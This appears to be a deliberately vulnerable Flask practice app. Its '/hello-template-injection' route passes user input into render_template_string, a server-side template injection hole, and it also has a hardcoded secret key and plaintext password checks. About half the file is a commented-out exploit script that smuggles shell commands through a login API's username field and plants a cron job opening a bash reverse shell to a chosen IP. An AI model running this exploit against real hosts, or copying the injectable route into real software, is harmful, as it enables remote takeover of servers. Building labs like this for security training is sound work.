from flask import Flask, render_template, render_template_string, request, flash, session
from sqlalchemy.orm import sessionmaker
from database_structure import *

app = Flask(__name__)
app.secret_key = "super secret key"
engine = create_engine('sqlite:///tutorial.db', echo=True)


@app.route('/')
def home():
    if not session.get('logged_in'):
        return render_template('login.html')
    else:
        return render_template('index.html')


@app.route('/item.html')
def show_item():
    return render_template('item.html')


@app.route('/login', methods=['POST'])
def do_admin_login():
    post_username = str(request.form['username'])
    post_password = str(request.form['password'])
    Session = sessionmaker(bind=engine)
    s = Session()
    query = s.query(User).filter(User.username.in_([post_username]), User.password.in_([post_password]))
    result = query.first()
    if result:
        session['logged_in'] = True
    else:
        flash('wrong password!')
        return home()

@app.route("/logout")
def logout():
    session['logged_in'] = False
    return home()

@app.route('/index.html')
def show_index():
    return render_template('index.html')

@app.route('/hello-template-injection')
def hello_ssti():
    person = {'name': "world", 'secret': "UGhldmJoZj8gYWl2ZnZoei5wYnovcG5lcnJlZg=="}
    if request.args.get('name'):
        person['name'] = request.args.get('name')
    template = '''<h2>Hello %s!</h2>''' % person['name']
    return render_template_string(template, person=person)

if __name__ == '__main__':
    app.run()

# if __name__ == "__main__":
# 	app.run(debug=True)

# import os
# import sys
# import ssl
# import json
# import urllib.request as request
#
#
# def main():
#     if (len(sys.argv) < 2):
#         print("Usage: %s <host> [\"cmd\" or shell...ip]\n" % sys.argv[0])
#         print("Eg:    %s 1.2.3.4 \"id\"" % sys.argv[0])
#         print("...    %s 1.2.3.4 shell 5.6.7.8\n" % sys.argv[0])
#         return
#
#     host = sys.argv[1]
#     cmd = sys.argv[2]
#
#     if (cmd == 'shell'):
#         if (len(sys.argv) < 4):
#             print("Error: need ip to connect back to for shell")
#             return
#
#         ip = sys.argv[3]
#
#         shell = "`echo \"* * * * * bash -i >& /dev/tcp/" + ip + "/5555 0>&1\" > /tmp/cronx; crontab /tmp/cronx`"
#         username = shell
#
#     else:
#         username = "`" + cmd + "`"
#
#     body = json.dumps({'username': username, 'password': 'test', 'mode': 'normal'})
#     byte = body.encode('utf-8')
#
#     url = "https://" + host + ":8000" + "/api/core/auth"
#
#     try:
#         req = request.Request(url)
#
#         req.add_header('Content-Type', 'application/json; charset=utf-8')
#         req.add_header('Content-Length', len(byte))
#
#         request.urlopen(req, byte, context=ssl._create_unverified_context())  # ignore the cert
#
#     except Exception as error:
#         print("Error: %s" % error)
#         return
#
#     print("Done!")
#
#
# if (__name__ == '__main__'):
#     main()
